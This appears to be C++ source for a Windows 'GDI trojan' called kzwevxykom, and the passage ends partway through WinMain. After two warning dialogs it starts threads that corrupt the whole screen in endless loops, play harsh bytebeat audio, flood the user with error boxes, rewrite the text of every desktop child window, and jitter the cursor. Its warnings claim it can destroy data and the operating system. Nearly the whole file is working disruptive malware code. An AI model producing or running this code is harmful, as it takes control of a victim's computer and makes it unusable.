#include <windows.h>
#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#include <math.h>
//#include <time.h>
#define M_PI 3.14159265358979323846264338327950288
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;

typedef struct {
    FLOAT h, s, l;
} HSL;

namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;
        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }
        hsl.h = h; hsl.s = s; hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;
        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;
        INT sextant;
        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;
            switch (sextant) {
            case 0:
                r = v; g = mid1; b = m;
                break;
            case 1:
                r = mid2; g = v; b = m;
                break;
            case 2:
                r = m; g = v; b = mid1;
                break;
            case 3:
                r = m; g = mid2; b = v;
                break;
            case 4:
                r = mid1; g = m; b = v;
                break;
            case 5:
                r = v; g = m; b = mid2;
                break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}

COLORREF RndRGB() {
    int clr = rand() % 5;
    if (clr == 0) return RGB(255, 0, 0);
    if (clr == 1) return RGB(0, 255, 0);
    if (clr == 2) return RGB(0, 0, 255);
    if (clr == 3) return RGB(255, 0, 255);
    if (clr == 4) return RGB(255, 255, 0);
}

LPCWSTR string() {
    srand(GetTickCount());
    WCHAR string[32];
    for (int i = 0; i < 32; i++) {
        string[i] = (WCHAR)(rand() % 256) + 1;
    }
    return string;
}

DWORD WINAPI shader1(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                int fx = (int)((i ^ 4) + (i * 4) * cbrt(RGB(5, 10, 15)));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI swirl(LPVOID lpParam) {
    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);
    int xSize = sh / 10, ySize = 9;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, screenshot);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        SelectObject(hdcMem, brush);
        BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, 0x1900AC010E);
        for (int i = 0; i < sh * 2; i++) {
            int wave = tan(i / ((float)xSize) * M_PI) * (ySize);
            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdcMem, brush);
            BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, 0x1900AC010E);
            DeleteObject(brush);
        }
        for (int i = 0; i < sw * 2; i++) {
            int wave = log2(i / ((float)xSize) * M_PI) * (ySize);
            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdcMem, brush);
            BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, 0x1900AC010E);
            DeleteObject(brush);
        }
        BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, 0x1900AC010E);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
        DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
    }
}

DWORD WINAPI swirl1(LPVOID lpParam) {
    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);
    int xSize = sh / 10, ySize = 9;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, screenshot);
        BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCINVERT);
        for (int i = 0; i < sh * 2; i++) {
            int wave = tan(i / ((float)xSize) * M_PI) * (ySize);
            BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCPAINT);
        }
        for (int i = 0; i < sw * 2; i++) {
            int wave = log2(i / ((float)xSize) * M_PI) * (ySize);
            BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, SRCPAINT);
        }
        BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCERASE);
        ReleaseDC(0, hdc);
        DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
    }
}

DWORD WINAPI shader2(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand() % 255;
        for (int i = 0; w * h > i; i++) {
            if (i % h == 0 && rand() % 100 == 0)
                v = rand() % 50;
            ((BYTE*)(data + i))[v % 3] = ((BYTE*)(data + i + v))[v] ^ byte;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCERASE);
        ReleaseDC(0, desk);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}

DWORD WINAPI train(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HBRUSH brush = CreateHatchBrush(rand() % 7, RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, 30, w, h, hdc, 0, 0, 0x1900AC010E);
        BitBlt(hdc, 0, -h + 30, w, h, hdc, 0, 0, 0x1900AC010E);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI textout(LPVOID lpvd) {
    while (true) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        SetBkMode(hdc, 0);
        LPCWSTR text = string();
        SetTextColor(hdc, Hue(239));
        HFONT hfnt = CreateFontA(70, 0, rand() % 50 - 25, 0, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
        SelectObject(hdc, hfnt);
        TextOutW(hdc, rand() % x, rand() % y, text, strlen((const char*)text));
        DeleteObject(hfnt);
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}

DWORD WINAPI plgblt(LPVOID lpParam) {
    RECT rect;
    POINT lpt[3];
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC mdc = CreateCompatibleDC(hdc);
        HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(mdc, hbit);
        GetWindowRect(GetDesktopWindow(), &rect);
        lpt[0].x = rect.left + 100; lpt[0].y = rect.top - 100;
        lpt[1].x = rect.right + 100; lpt[1].y = rect.top - 0;
        lpt[2].x = rect.left + 0; lpt[2].y = rect.bottom + 0;
        PlgBlt(mdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, NOTSRCERASE);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader3(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                int fx = x * y ^ 2 + 3;
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI textout1(LPVOID lpvd) {
    while (true) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        SetBkMode(hdc, 0);
        LPCSTR text = "kzwevxykom";
        SetTextColor(hdc, Hue(239));
        HFONT hfnt = CreateFontA(70, 40, rand() % 60, 0, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
        SelectObject(hdc, hfnt);
        TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
        DeleteObject(hfnt);
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}

DWORD WINAPI up(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(dcCopy, bmp);
    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;
    while (true) {
        hdc = GetDC(NULL);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 20, 20, SRCCOPY);
        AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);
    }
    return 0x00;
}

DWORD WINAPI triangles(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        TRIVERTEX vtx[3];
        vtx[0].x = rand() % w; vtx[0].y = rand() % h;
        vtx[1].x = rand() % w; vtx[1].y = rand() % h;
        vtx[2].x = rand() % w; vtx[2].y = rand() % h;
        vtx[0].Red = 0xbbb0; vtx[0].Green = 0xfff0; vtx[0].Blue = 0; vtx[0].Alpha = 0;
        vtx[1].Red = 0; vtx[1].Green = 0; vtx[1].Blue = 0; vtx[1].Alpha = 0;
        vtx[2].Red = 0; vtx[2].Green = 0xbbb0; vtx[2].Blue = 0xd000; vtx[2].Alpha = 0xff00;
        GRADIENT_TRIANGLE gt;
        gt.Vertex1 = 0; gt.Vertex2 = 1; gt.Vertex3 = 2;
        GradientFill(hdc, vtx, 4, &gt, 1, GRADIENT_FILL_TRIANGLE);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 0x00;
}

DWORD WINAPI shader4(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                int fx = (x ^ 2 - 4 + y + i) / 2 + y;
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI shader5(LPVOID lpParam) {
    int ticks = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 1;; i++, i %= 21) {
        if (!i) for (int c = 0; c < 100; c++) InvalidateRect(0, 0, 0);
        HDC hdc = GetDC(0);
        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0; BYTE bt = 0;
        if ((GetTickCount() - ticks) > 60000)
            bt = 2 + rand() & 255;
        for (int i = 1; w * h > i; i++) {
            if (i % h == 0 && rand() % 100 == 0)
                v = 3 + rand() % 50;
            ((BYTE*)(data + i))[v % 3] += ((BYTE*)(data + bt))[bt] ^ i;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, NOTSRCERASE);
        DeleteObject(hbm);
        DeleteObject(hdcMem);
        DeleteObject(hdc);
        ReleaseDC(0, hdc);
    }
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24000, 24000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[24000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t ^ t >> 8) * (t & t >> 5) + (t & t << 4) + (t & t >> 6)) / 6749);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t + t >> 8) * (t & t >> 5) + (t & t << 4) + (t & t >> 7)) / 69);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t + t >> 8) * (t & t >> 5) ^ (t & t << 4) ^ (t & t >> 7)) / 197);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t & t >> 11) * (t >> 6 | t >> 8);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 10 & t << 3 >> 12));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24000, 24000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[24000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t ^ t >> 8) * (t | t >> 10) + (t | t << 19) + (t | t >> 2)) / 1000);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(9 * t * (t >> 5 | t >> 8) >> (t >> 16));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 8 * (t >> 15 | t >> 8) & (20 | t ^ t >> 7 | t >> 3)) | t >> 2);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24000, 24000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[24000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t ^ t >> 1) * (t | t >> 1) + (t | t << 1) + (t | t >> 12)) / 1000);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI msg(LPVOID lpParam) {
    while (true) {
        MessageBoxW(0, NULL, L"kzwevxykom", MB_CANCELTRYCONTINUE | MB_ICONERROR);
    }
    return 0;
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)string(), SMTO_ABORTIFHUNG, 100, NULL);
    return true;
}

DWORD WINAPI textz(LPVOID lpParam) {
    while (true) {
        BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
        EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
        Sleep(10);
    }
}

DWORD WINAPI cur1(LPVOID lpParam) {
    while (true) {
        POINT cpt;
        GetCursorPos(&cpt);
        int x = cpt.x, y = cpt.y;
        SetCursorPos(x + rand() % 2 + rand() % 2, y + rand() % 2 + rand() % 2);
        Sleep(10);
        SetCursorPos(x - rand() % 2 + rand() % 2, y - rand() % 2 + rand() % 2);
        Sleep(10);
    }
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    if (MessageBoxW(NULL, L"Warning! You have ran a trojan known as kzwevxykom that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"kzwevxykom", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    else {
        if (MessageBoxW(NULL, L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"kzwevxykom", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
            ExitProcess(0);
        }
        else {
            Sleep(4000);
            CreateThread(0, 0, msg, 0, 0, 0);
            Sleep(1000);
            HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
            HANDLE thread1dot1 = CreateThread(0, 0, swirl, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            TerminateThread(thread1dot1, 0);
            CloseHandle(thread1dot1);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread2 = CreateThread(0, 0, swirl1, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread3 = CreateThread(0, 0, shader2, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread4 = CreateThread(0, 0, train, 0, 0, 0);
            HANDLE thread4dot1 = CreateThread(0, 0, textout, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            CreateThread(0, 0, textz, 0, 0, 0);
